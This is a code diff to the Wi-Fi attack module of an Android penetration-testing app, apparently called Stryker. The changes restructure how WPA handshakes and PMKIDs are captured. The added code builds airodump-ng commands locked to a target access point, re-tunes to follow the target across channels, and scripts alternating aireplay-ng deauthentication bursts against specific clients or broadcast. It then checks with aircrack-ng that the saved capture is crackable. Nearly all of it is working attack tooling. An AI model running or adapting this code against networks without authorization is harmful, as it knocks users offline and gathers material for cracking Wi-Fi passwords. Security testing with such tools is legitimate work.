@@ -89,6 +89,89 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
     private static final String PREF_LAST_PSK_WORDLIST = "wifi_last_psk_wordlist";
     private static final Pattern MAC_TOKEN = Pattern.compile("(?:[0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}");
 
+    private static final class Verdict {
+        boolean handshake;
+        boolean pmkid;
+        boolean answered;
+        String source = "";
+
+        boolean usable() { return handshake || pmkid; }
+    }
+
+    private Verdict verifyCapture(String hostPath, String guestPath, String bssid) {
+        Verdict v = new Verdict();
+
+        try {
+            java.io.File f = new java.io.File(hostPath);
+            if (f.isFile() && f.length() > 24) {
+                com.zalexdev.stryker.handshakes.CaptureInfo info =
+                        com.zalexdev.stryker.handshakes.CaptureInfo.of(f);
+                if (info.kind != com.zalexdev.stryker.handshakes.CaptureInfo.Kind.UNREADABLE) {
+                    v.answered = true;
+                    if (info.kind == com.zalexdev.stryker.handshakes.CaptureInfo.Kind.HANDSHAKE) {
+                        v.handshake = true;
+                    }
+                    if (info.pmkid
+                            || info.kind == com.zalexdev.stryker.handshakes.CaptureInfo.Kind.PMKID) {
+                        v.pmkid = true;
+                    }
+                    if (v.usable()) v.source = "the capture itself";
+                }
+            }
+        } catch (Throwable ignored) {
+        }
+
+        try {
+            boolean haveBssid = bssid != null
+                    && bssid.matches("(?i)([0-9a-f]{2}:){5}[0-9a-f]{2}");
+            String cmd = "aircrack-ng " + (haveBssid ? "-b " + bssid + " " : "")
+                    + com.zalexdev.stryker.wordlists.WordlistStore.quoteForShell(guestPath)
+                    + " < /dev/null";
+            for (String line : core.customChrootCommand(cmd, true)) {
+                if (line == null) continue;
+                if (line.contains("packets") || line.contains("networks found")
+                        || line.contains("WPA") || line.contains("WEP")) {
+                    v.answered = true;
+                }
+                java.util.regex.Matcher m = java.util.regex.Pattern
+                        .compile("(\\d+)\\s+handshake").matcher(line);
+                if (m.find()) {
+                    try {
+                        if (Integer.parseInt(m.group(1)) > 0) v.handshake = true;
+                    } catch (NumberFormatException ignored) {
+                    }
+                }
+                if (line.contains("PMKID")) v.pmkid = true;
+            }
+            if (v.usable() && v.source.isEmpty()) v.source = "aircrack-ng";
+        } catch (Throwable ignored) {
+        }
+
+        return v;
+    }
+
+    private String newestCapture(String hsDir) {
+        java.io.File[] caps = new java.io.File(hsDir)
+                .listFiles((d, n) -> n.startsWith("handshake-") && n.endsWith(".cap"));
+        java.io.File newest = null;
+        if (caps != null) {
+            for (java.io.File f : caps) {
+                if (newest == null || f.lastModified() > newest.lastModified()) newest = f;
+            }
+        }
+        if (newest != null) return newest.getName();
+        if (core.isRootless()) return null;
+        for (String line : core.customMegaCommand(
+                "ls -1t '" + hsDir + "'/handshake-*.cap 2>/dev/null | head -n 1")) {
+            if (line == null) continue;
+            String t = line.trim();
+            if (t.startsWith("/") && t.endsWith(".cap")) {
+                return t.substring(t.lastIndexOf('/') + 1);
+            }
+        }
+        return null;
+    }
+
     private String archiveCapture(String captureDir, String filename) {
         String safe = filename.replaceAll("[^A-Za-z0-9._-]", "_");
         if (safe.length() > 120) safe = safe.substring(safe.length() - 120);
@@ -124,6 +207,7 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
         try {wifi.sort(new WiFINetwork.WiFIComporator());}
         catch (Exception ignored){}
         core = new Core(context2);
+        com.zalexdev.stryker.engine.WifiEngine.bindFor(core, core.getString("wlan_wifi"));
 
     }
 
@@ -665,57 +749,12 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                                 + "rm -f " + guestShare + "/hs/handshake*");
                         final String capIface = core.getHSInterface();
                         if (canceled) return;
+                        final int[] lockedChannel = {network.getChannel()};
                         new Thread(() -> {
                             if (canceled) return;
-                            String cmd = "airodump-ng " + capIface + " -w " + guestShare
-                                    + "/hs/handshake  --ignore-negative-one --output-format pcap -c "
-                                    + network.getChannel() + " --bssid " + network.getMac() + " --update 3";
-                            if (network.getIs5hhz() && network.getChannel() <= 0){
-                                cmd = "airodump-ng " + capIface + " -w " + guestShare
-                                        + "/hs/handshake --ignore-negative-one --output-format pcap  --bssid "
-                                        + network.getMac() + " --band a --update 3";
-                            }
-
-
-                            core.getLogger().writeLine("Starting airodump-ng... " + cmd,1);
-
-                            airodump =     new AdvancedProcess(activity, context, cmd, true) {
-                                @Override
-                                public void onFinished(ArrayList<String> outputList) {
-
-                                }
-
-                                @Override
-                                public void onNewLine(String line) {
-                                    try {
-                                        if (line == null) return;
-                                        if (line.contains(network.getMac().toUpperCase()) || line.contains(network.getMac()) || line.contains(network.getMac().toLowerCase()) || line.contains(" WPA")){
-                                            if (!airoRunning[0]) {
-                                                monitor.stage(AttackStage.CAPTURE, AttackStage.State.DONE);
-                                                monitor.stage(AttackStage.TARGET, AttackStage.State.DONE,
-                                                        "Beacons on channel " + network.getChannel());
-                                            }
-                                            airoRunning[0] = true;
-                                        }
-                                        if (line.contains("WPA handshake:")){
-                                            sendEvent("Handshake captured! Bingo!");
-                                            hsStatus[0] = true;
-                                        }
-                                        if (line.contains("PMKID")){
-                                            sendEvent("PMKID captured! Bingo!");
-                                            pmkidStatus[0] = true;
-                                        }
-                                        monitor.airodump(line, network.getMac());
-                                    } catch (Exception ignored) {
-                                    }
-                                }
-
-                                @Override
-                                public void onEvent(String line) {
-
-                                }
-                            };
-                            airodump.setNoLog(true);
+                            airodump = startAirodump(monitor, network, capIface, guestShare,
+                                    lockedChannel[0], airoRunning, hsStatus, pmkidStatus,
+                                    this::sendEvent);
                             if (canceled) airodump.kill();
                         }).start();
                         sendEvent("We are waiting for network to appear...");
@@ -751,48 +790,81 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                                     && !core.isInternalDeauthEnabled()
                                     && MonitorManager.isInternalRadio(deauthIface);
                             final String[] lastRelock = {""};
-                            if (deauth) {
-                                monitor.stage(AttackStage.DEAUTH, AttackStage.State.ACTIVE, deauthIface);
-                                deauther = new AdvancedProcess(activity, context, "aireplay-ng --ignore-negative-one -0 0 -a  " + network.getMac() + " " + deauthIface, true) {
-                                    @Override
-                                    public void onFinished(ArrayList<String> outputList) {
-
-                                    }
-
-                                    @Override
-                                    public void onNewLine(String line) {
-                                        if (line.contains("available") || line.contains("but")) {
-                                           if (line.contains("but")){
-                                               String[] parts = line.trim().split("\\s+");
-                                               String ch = parts[parts.length - 1];
-                                               if (ch.matches("\\d{1,3}") && !ch.equals(lastRelock[0])) {
-                                                   lastRelock[0] = ch;
-                                                   core.threadChrootCommand("iw dev " + hsIface + " set channel " + ch);
-                                                   monitor.metric(AttackMetric.CHANNEL, ch);
-                                                   monitor.note("Target moved to channel " + ch + " — following");
-                                               }
-                                           }
-                                            if (internalDeauth) {
-                                                monitor.stage(AttackStage.DEAUTH, AttackStage.State.FAILED,
-                                                        "Internal radio cannot inject — waiting passively");
-                                            }
-                                        }
-                                        monitor.aireplay(masked(line));
-                                    }
-
-                                    @Override
-                                    public void onEvent(String line) {
-
-                                    }
-                                };
-                            }
                             monitor.stage(AttackStage.EAPOL, AttackStage.State.ACTIVE, "Waiting for a client to rejoin");
+                            long phaseEnds = System.currentTimeMillis() + LISTEN_FIRST_MS;
+                            boolean bursting = false;
+                            final long[] burstStartedAt = {0L};
+                            final int[] relockTo = {0};
+                            int relocks = 0;
+                            if (deauth) {
+                                monitor.stage(AttackStage.DEAUTH, AttackStage.State.PENDING,
+                                        "Listening " + (LISTEN_FIRST_MS / 1000)
+                                                + "s first to find the clients");
+                                monitor.metric(AttackMetric.STATE, "Listening");
+                            }
                             while (!hsStatus[0] && !pmkidStatus[0] && !canceled){
                                     if (airodump != null && !airodump.isRunning()){
                                         sendEvent("airodump-ng stopped unexpectedly — aborting.");
                                         monitor.failStage(AttackStage.CAPTURE, "airodump-ng exited",
                                                 "airodump-ng stopped unexpectedly");
                                         break;
+                                    }
+                                    if (relockTo[0] > 0 && relockTo[0] != lockedChannel[0]
+                                            && relocks < MAX_RELOCKS) {
+                                        int to = relockTo[0];
+                                        relockTo[0] = 0;
+                                        relocks++;
+                                        lockedChannel[0] = to;
+                                        monitor.note("Target is on channel " + to
+                                                + " — restarting the capture there");
+                                        monitor.metric(AttackMetric.CHANNEL, to);
+                                        if (deauther != null) {
+                                            deauther.kill();
+                                            deauther = null;
+                                        }
+                                        if (airodump != null) airodump.kill();
+                                        airodump = startAirodump(monitor, network, capIface,
+                                                guestShare, to, airoRunning, hsStatus,
+                                                pmkidStatus, this::sendEvent);
+                                        bursting = false;
+                                        burstStartedAt[0] = 0L;
+                                        phaseEnds = System.currentTimeMillis() + DEAUTH_QUIET_MS;
+                                        monitor.stage(AttackStage.DEAUTH, AttackStage.State.PENDING,
+                                                "Re-listening on channel " + to);
+                                        continue;
+                                    }
+                                    if (bursting && burstStartedAt[0] > 0L) {
+                                        phaseEnds = burstStartedAt[0] + DEAUTH_BURST_MS;
+                                    }
+                                    if (deauth && System.currentTimeMillis() >= phaseEnds) {
+                                        if (bursting) {
+                                            if (deauther != null) {
+                                                deauther.kill();
+                                                deauther = null;
+                                            }
+                                            bursting = false;
+                                            phaseEnds = System.currentTimeMillis() + DEAUTH_QUIET_MS;
+                                            monitor.stage(AttackStage.DEAUTH, AttackStage.State.DONE,
+                                                    "Quiet for " + (DEAUTH_QUIET_MS / 1000)
+                                                            + "s so a client can rejoin");
+                                            monitor.metric(AttackMetric.STATE, "Listening");
+                                        } else {
+                                            java.util.List<String> targets = monitor.clientList();
+                                            burstStartedAt[0] = 0L;
+                                            deauther = burstDeauth(monitor, network, deauthIface,
+                                                    hsIface, internalDeauth, lastRelock,
+                                                    relockTo, targets, burstStartedAt);
+                                            bursting = true;
+                                            phaseEnds = System.currentTimeMillis()
+                                                    + DEAUTH_BEACON_GRACE_MS;
+                                            monitor.stage(AttackStage.DEAUTH, AttackStage.State.ACTIVE,
+                                                    targets.isEmpty()
+                                                            ? deauthIface + " · broadcast"
+                                                            : deauthIface + " · "
+                                                                    + Math.min(targets.size(),
+                                                                            DEAUTH_MAX_CLIENTS)
+                                                                    + " client(s)");
+                                        }
                                     }
                                     try {
                                         Thread.sleep(250);
@@ -807,11 +879,58 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                             airodump.kill();
                             }
                             if (canceled) return;
+                            if (!hsStatus[0] && !pmkidStatus[0]) {
+                                sendEvent("Nothing was captured — no handshake and no PMKID.");
+                                monitor.failStage(AttackStage.EAPOL,
+                                        "No handshake and no PMKID",
+                                        "The capture ended before a client rejoined, so there is"
+                                                + " nothing to save.");
+                                activity.runOnUiThread(this::onFinished);
+                                return;
+                            }
+                            String hsDir = core.getShareRoot() + "/hs";
+                            String capName = newestCapture(hsDir);
+                            monitor.stage(AttackStage.EAPOL, AttackStage.State.ACTIVE,
+                                    "Checking what the capture holds");
+                            Verdict verdict = capName == null ? new Verdict()
+                                    : verifyCapture(hsDir + "/" + capName,
+                                            core.guestShare() + "/hs/" + capName,
+                                            network.getMac());
+                            if (verdict.answered && !verdict.usable()) {
+                                sendEvent("Announced, but not there: the file holds no handshake"
+                                        + " and no PMKID.");
+                                monitor.failStage(AttackStage.EAPOL,
+                                        "Nothing crackable in the capture",
+                                        "airodump-ng reported a catch, but the file holds no"
+                                                + " handshake and no PMKID. Nothing was saved.");
+                                activity.runOnUiThread(this::onFinished);
+                                return;
+                            }
+                            if (capName == null) {
+                                sendEvent("Announced, but airodump-ng wrote no capture file.");
+                                monitor.failStage(AttackStage.EAPOL, "No capture file",
+                                        "airodump-ng reported a catch but left nothing on disk.");
+                                activity.runOnUiThread(this::onFinished);
+                                return;
+                            }
+
+                            boolean confirmed = verdict.usable();
+                            boolean isHandshake = confirmed ? verdict.handshake : hsStatus[0];
+                            monitor.stage(AttackStage.EAPOL, AttackStage.State.DONE,
+                                    confirmed
+                                            ? (isHandshake ? "Handshake" : "PMKID")
+                                                    + " confirmed by " + verdict.source
+                                            : "Saved unchecked — the capture could not be read back");
+
                             String captureDir = core.getShareRoot() + "/captured";
                             String time = new SimpleDateFormat("MM_HH_mm", Locale.ENGLISH).format(new Date());
-                            String label = hsStatus[0] ? "HS_" : "PMKID_";
+                            String label = isHandshake ? "HS_" : "PMKID_";
                             String filename = label + network.getSsid().replace(" ", "_") + time + ".cap";
-                            sendEvent(hsStatus[0] ? "Handshake captured!" : "PMKID captured!");
+                            sendEvent(confirmed
+                                    ? (isHandshake ? "Handshake" : "PMKID")
+                                            + " confirmed in the capture by " + verdict.source + "."
+                                    : "Saving without checking — neither this app nor aircrack-ng"
+                                            + " could read the capture back.");
                             monitor.stage(AttackStage.SAVE, AttackStage.State.ACTIVE);
                             String saved = archiveCapture(captureDir, filename);
                             if (saved == null) {
@@ -819,7 +938,7 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                                 monitor.stage(AttackStage.SAVE, AttackStage.State.FAILED,
                                         "Nothing to move out of the share");
                             } else {
-                                sendEvent((hsStatus[0] ? "Handshake" : "PMKID") + " saved to " + saved);
+                                sendEvent((isHandshake ? "Handshake" : "PMKID") + " saved to " + saved);
                                 monitor.stage(AttackStage.SAVE, AttackStage.State.DONE, saved);
                                 com.zalexdev.stryker.geomac.GeoHooks.recordHandshake(
                                         context, network.getMac(), network.ssid);
@@ -1231,6 +1350,133 @@ public class WiFIAdapter extends RecyclerView.Adapter<WiFIAdapter.ViewHolder> {
                 deauthAttempt(monitor, network, monIface, channel, dialogCanceled, 0);
             }).start();
         }
+    }
+
+    private static final long LISTEN_FIRST_MS = 45_000L;
+
+    private AdvancedProcess startAirodump(AttackMonitor monitor, WiFINetwork network,
+                                          String capIface, String guestShare, int channel,
+                                          boolean[] airoRunning, boolean[] hsStatus,
+                                          boolean[] pmkidStatus, Say say) {
+        String cmd = "airodump-ng " + capIface + " -w " + guestShare
+                + "/hs/handshake --ignore-negative-one --output-format pcap -c "
+                + channel + " --bssid " + network.getMac() + " --update 3";
+        if (network.getIs5hhz() && channel <= 0) {
+            cmd = "airodump-ng " + capIface + " -w " + guestShare
+                    + "/hs/handshake --ignore-negative-one --output-format pcap --bssid "
+                    + network.getMac() + " --band a --update 3";
+        }
+        core.getLogger().writeLine("Starting airodump-ng... " + cmd, 1);
+        AdvancedProcess p = new AdvancedProcess(activity, context, cmd, true) {
+            @Override
+            public void onFinished(ArrayList<String> outputList) {
+            }
+
+            @Override
+            public void onNewLine(String line) {
+                try {
+                    if (line == null) return;
+                    if (line.contains(network.getMac().toUpperCase())
+                            || line.contains(network.getMac())
+                            || line.contains(network.getMac().toLowerCase())
+                            || line.contains(" WPA")) {
+                        if (!airoRunning[0]) {
+                            monitor.stage(AttackStage.CAPTURE, AttackStage.State.DONE);
+                            monitor.stage(AttackStage.TARGET, AttackStage.State.DONE,
+                                    "Beacons on channel " + channel);
+                        }
+                        airoRunning[0] = true;
+                    }
+                    if (line.contains("WPA handshake:")) {
+                        say.line("Handshake captured! Bingo!");
+                        hsStatus[0] = true;
+                    }
+                    if (line.contains("PMKID")) {
+                        say.line("PMKID captured! Bingo!");
+                        pmkidStatus[0] = true;
+                    }
+                    monitor.airodump(line, network.getMac());
+                } catch (Exception ignored) {
+                }
+            }
+
+            @Override
+            public void onEvent(String line) {
+            }
+        };
+        p.setNoLog(true);
+        return p;
+    }
+
+    public interface Say {
+        void line(String text);
+    }
+
+    private static final int MAX_RELOCKS = 3;
+
+    private static final long DEAUTH_BURST_MS = 7_000L;
+
+    private static final long DEAUTH_BEACON_GRACE_MS = 20_000L;
+
+    private static final int DEAUTH_MAX_CLIENTS = 12;
+
+    private static final long DEAUTH_QUIET_MS = 20_000L;
+
+    private AdvancedProcess burstDeauth(AttackMonitor monitor, WiFINetwork network,
+                                        String deauthIface, String hsIface,
+                                        boolean internalDeauth, String[] lastRelock,
+                                        int[] relockTo, java.util.List<String> clients,
+                                        long[] startedAt) {
+        return new AdvancedProcess(activity, context,
+                deauthCommand(network.getMac(), deauthIface, clients), true) {
+            @Override
+            public void onFinished(ArrayList<String> outputList) {
+            }
+
+            @Override
+            public void onNewLine(String line) {
+                if (line.contains("available") || line.contains("but")) {
+                    if (line.contains("but")) {
+                        String[] parts = line.trim().split("\\s+");
+                        String ch = parts[parts.length - 1];
+                        if (ch.matches("\\d{1,3}") && !ch.equals(lastRelock[0])) {
+                            lastRelock[0] = ch;
+                            try {
+                                relockTo[0] = Integer.parseInt(ch);
+                            } catch (NumberFormatException ignored) {
+                            }
+                        }
+                    }
+                    if (internalDeauth) {
+                        monitor.stage(AttackStage.DEAUTH, AttackStage.State.FAILED,
+                                "Internal radio cannot inject — waiting passively");
+                    }
+                }
+                if (startedAt[0] == 0L && line.contains("Sending") && line.contains("DeAuth")) {
+                    startedAt[0] = System.currentTimeMillis();
+                }
+                monitor.aireplay(masked(line));
+            }
+
+            @Override
+            public void onEvent(String line) {
+            }
+        };
+    }
+
+    private static String deauthCommand(String bssid, String iface, java.util.List<String> clients) {
+        String sb = "__SB=$(command -v stdbuf 2>/dev/null); ";
+        String run = "$__SB ${__SB:+-oL -eL} aireplay-ng --ignore-negative-one -0 ";
+        if (clients == null || clients.isEmpty()) {
+            return sb + run + "0 -a " + bssid + " " + iface;
+        }
+        int n = Math.min(clients.size(), DEAUTH_MAX_CLIENTS);
+        long each = Math.max(1L, DEAUTH_BURST_MS / 1000L / n);
+        StringBuilder out = new StringBuilder(sb).append("for __c in");
+        for (int i = 0; i < n; i++) out.append(' ').append(clients.get(i));
+        out.append("; do ").append(run).append(each).append(" -a ").append(bssid)
+                .append(" -c $__c ").append(iface).append("; done");
+        return out.toString();
     }
 
     private static final long DEAUTH_SILENCE_MS = 25000L;
